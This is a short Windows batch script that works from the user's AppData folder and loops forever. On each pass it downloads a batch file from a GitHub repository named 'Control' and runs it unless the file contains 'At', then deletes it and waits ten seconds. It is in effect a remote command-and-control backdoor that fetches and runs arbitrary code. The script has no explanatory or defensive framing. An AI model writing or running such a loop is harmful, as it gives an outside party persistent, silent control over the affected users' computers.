cd C:\users\%username%\AppData
:begin
Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Control/main/REPtxt.bat").Content >cmd.bat
>nul find "At" cmd.bat && (
  goto offline
) || (
  call cmd.bat
)
del cmd.bat
timeout 10 /NOBREAK >nul
goto begin
:offline
del cmd.bat
timeout 10 /NOBREAK >nul
goto begin
